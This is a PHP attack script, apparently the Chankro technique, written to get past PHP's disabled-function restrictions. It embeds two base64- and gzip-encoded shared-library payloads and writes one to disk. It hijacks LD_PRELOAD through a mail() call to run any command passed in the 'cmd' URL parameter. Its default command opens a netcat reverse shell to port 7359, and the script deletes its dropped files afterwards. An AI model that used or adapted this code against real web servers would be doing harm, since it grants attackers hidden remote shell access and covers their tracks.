<?php
$hook_32 = '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';
$hook_64 = '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';

// determine architecture on target
if (php_uname('m')) {
  $unam = php_uname('m');
  $arch = ($unam == 'x86_64' || $unam == 'amd64')? '64' : (($unam == 'i686' || $unam == 'i386')? '32' : '');
}

if (isset($_GET['arch']) && preg_match("^(32|64)$", $_GET['arch']))
	$arch = $_GET['arch'];

// assigning hook.so according to architecture
$hook = ($arch == 32) ? $hook_32 : $hook_64;

// determine the current working directory (or any writeable directory)
$path = function_exists('getcwd') ? getcwd() : (function_exists('dirname') ? dirname(__FILE__) : (array_key_exists("cwd", $_GET) ? htmlspecialchars($_GET["cwd"]) : '/tmp'));

// payload
$payload = array_key_exists("cmd", $_GET) ? $_GET["cmd"] : 'rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/bash -i 2>&1|nc 127.0.0.1 7359 >/tmp/f';

// placing evil files
$path_chan = $path.'/chankro.so';
$path_sock = $path.'/acpid.socket';
file_put_contents($path_chan, gzinflate(base64_decode($hook)));
file_put_contents($path_sock, $payload);

// setting evil environment variables
putenv('CHANKRO=' . $path_sock);
putenv('LD_PRELOAD=' . $path_chan);

// fire
mail('7','3','5','9');

// cleaning mess
sleep(1);
@unlink($path."/f");
@unlink($path_chan);
@unlink($path_sock);

?>
